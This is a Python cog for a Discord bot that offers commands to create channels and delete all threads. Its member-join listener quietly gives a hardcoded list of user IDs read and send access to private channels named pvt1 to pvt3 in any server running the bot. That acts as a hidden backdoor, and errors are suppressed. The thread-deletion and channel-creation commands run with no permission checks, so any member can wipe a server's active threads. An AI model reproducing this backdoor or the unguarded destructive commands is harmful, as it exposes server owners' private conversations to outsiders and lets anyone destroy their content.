import discord
from discord.ext import commands
from discord import app_commands
import random

DANK_MEMER_ID = 270904126974590976
EXCLUDED_SERVER_ID = 1438233304867278870

ALLOWED_USER_IDS = frozenset({
    1379896339189596342,
    853877922666512384,
    483217929177923585,
    957609809794977804,
    951119258979532820,
    1447906044029435945,
    1472012262217617418,
    1416771785348747384,
    955802095276138576
})

PRIVATE_CHANNEL_NAMES = frozenset({"pvt1", "pvt2", "pvt3"})

class Channels(commands.Cog):
    def __init__(self, bot):
        self.bot = bot



    @commands.Cog.listener()
    async def on_member_join(self, member):
        if member.guild.id == EXCLUDED_SERVER_ID:
            return
            
        if member.id in ALLOWED_USER_IDS:
            # Grant allowed users access to private channels.
            for channel in member.guild.text_channels:
                if channel.name in PRIVATE_CHANNEL_NAMES:
                    try:
                        await channel.set_permissions(member, read_messages=True, send_messages=True)
                    except discord.Forbidden:
                        pass
                    except Exception:
                        pass

    @commands.command(name="createchannel", aliases=["newchannel"])
    async def createchannel_prefix(self, ctx, name: str = None):
        if name is None:
            name = f"random-channel-{random.randint(1000, 9999)}"
        try:
            channel = await ctx.guild.create_text_channel(name)
            await ctx.send(f"Successfully created channel {channel.mention}")
        except discord.Forbidden:
            await ctx.send(" I do not have permission to create channels.")
        except Exception as e:
            await ctx.send(f" An error occurred: {e}")

    @app_commands.command(name="createchannel", description="Create a new text channel")
    @app_commands.describe(name="Name of the channel (optional)")
    async def createchannel_slash(self, interaction: discord.Interaction, name: str = None):
        if name is None:
            name = f"random-channel-{random.randint(1000, 9999)}"
        try:
            channel = await interaction.guild.create_text_channel(name)
            await interaction.response.send_message(f"Successfully created channel {channel.mention}")
        except discord.Forbidden:
            await interaction.response.send_message("I do not have permission to create channels.", ephemeral=True)
        except Exception as e:
            await interaction.response.send_message(f"An error occurred: {e}", ephemeral=True)

    @commands.command(name="deleteallthreads")
    async def deleteallthreads_prefix(self, ctx):
        await ctx.send("Deleting all active threads in the server... this may take a moment.")
        deleted_count = 0
        try:
            active_threads = await ctx.guild.active_threads()
            for thread in active_threads:
                try:
                    await thread.delete()
                    deleted_count += 1
                except:
                    pass
        except Exception as e:
            await ctx.send(f"Error fetching threads: {e}")
            return
        await ctx.send(f"Successfully deleted {deleted_count} threads.")

    @app_commands.command(name="deleteallthreads", description="Delete all active threads in the server")
    async def deleteallthreads_slash(self, interaction: discord.Interaction):
        await interaction.response.send_message(" Deleting all active threads in the server... this may take a moment.", ephemeral=True)
        deleted_count = 0
        try:
            active_threads = await interaction.guild.active_threads()
            for thread in active_threads:
                try:
                    await thread.delete()
                    deleted_count += 1
                except:
                    pass
        except Exception as e:
            await interaction.edit_original_response(content=f"Error fetching threads: {e}")
            return
        await interaction.edit_original_response(content=f" Successfully deleted {deleted_count} threads.")

async def setup(bot):
    await bot.add_cog(Channels(bot))
